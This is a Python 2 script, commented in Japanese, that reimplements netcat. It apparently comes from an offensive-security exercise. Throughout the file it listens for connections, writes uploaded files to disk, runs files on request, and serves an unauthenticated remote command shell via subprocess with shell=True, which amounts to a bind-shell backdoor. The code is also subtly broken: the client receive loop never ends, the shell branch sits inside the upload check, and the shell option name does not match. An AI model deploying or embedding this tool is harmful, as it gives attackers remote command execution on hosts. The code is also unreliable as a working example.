# -*- coding: UTF-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print "Test Net tool"
    print
    print "Usage: net-tool.py -t targethost -p port"
    print "-l --listn                     - listen on [host]:[port] for" 
    print "                                 incoming connections"
    print "-e --execute=file_to_run       - execute the given file upon"
    print "                                 receiving a connection"
    print "-c --command                   - initialize a command shell"
    print "-u --upload=destination        - upon receiving connection upload a"
    print "                                 file and write to [destination]"


def client_sender(buffer):
    """クライアントに応答する処理

    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 標的ホストへの接続
        client.connect((target, port))
        
        if len(buffer):
            client.send(buffer)

        while True:
            # 標的ホストからのデータを待機
            recv_len = 1
            response = ""

            while recv_len:
                data        = client.recv(4096)
                recv_len    = len(data)
                response   += data
                
                if recv_len < 4096:
                    break
        
        print response,
        
        
        # 追加の入力の待機
        buffer  = raw_input("")
        buffer += "\n"

        # データの送信
        client.send(buffer) 


    except:
        print "[*] Exception! Exiting."
        
        # 接続の終了
        client.close()


def server_loop():
    """サーバのメインループ処理

    """
    global target

    # 待機するIPアドレスが指定されていない場合は
    # すべてのインターフェースで接続を待機
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    server.bind((target,port)) 

    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        # クライアントからの新しい接続を処理するスレッドの起動
        client_thread = threading.Thread(
                target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    """コマンド実行

    渡されたコマンドをローカルOSで実行  
    """
     
    # 文字列の末尾の改行を削除
    command = command.rstrip()
    
    # コマンドを実行し出力結果を取得
    try:
        output = subprocess.check_output(
                command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command. \r\n"

    # 出力結果をクライアントに送信
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command
    
    # ファイルアップロードを指定されているかどうかの確認
    if len(upload_destination):
        
        # すべてのデータを読み取り、指定されたファイルにデータを書き込み
        file_buffer = ""

        # 受信データがなくなるまでデータ受信を継続
        while True:
            data = client_socket.recv(1024)
            
            if len(data) == 0:
                break
            else:
                file_buffer += data
        
        # 受信したデータをファイルに書き込み
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            # ファイル書き込みの成否を通知
            client_socket.send(
                "Successfully saved file to %s\r\n" % upload_destination)
        
        except:
            client_socket.send(
                "Failed to save file to %s\r\n" % upload_destination)

        # コマンド実行を指定されているか確認
        if len(execute):
            
            # コマンドの実行
            output = run_command(execute)
            
            client_socket.send(output)

        
        # コマンドシェルの実行を指定されている場合の処理
        if command:
            
            # プロンプトの表示
            prompt = "<Net Tool:#> "
            client_socket.send(prompt)
            
            while True:
    
                # 改行による割込みが起こるまで、データを送信しつづける
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                # コマンドの実行結果を取得
                response = run_command(cmd_buffer)
                response += prompt

                # コマンドの実行結果を送信
                client_socket.send(response)



def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()

    # コマンドラインオプションの読み込み
    try:
        opts, args = getopt.getopt(
                sys.argv[1:],
                "hle:t:p:cu:",
                ["help", "listen", "execute=", "target=",
                "port=", "command", "upload="])
    
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unbandled Option"

    # 標準出力かデータを受け取り送信
    if not listen and len(target) and port > 0:
        
        # データを格納
        buffer = raw_input("please input")

        # データの送信
        client_sender(buffer)

    # 接続待機開始
    if listen:
        server_loop()


main()
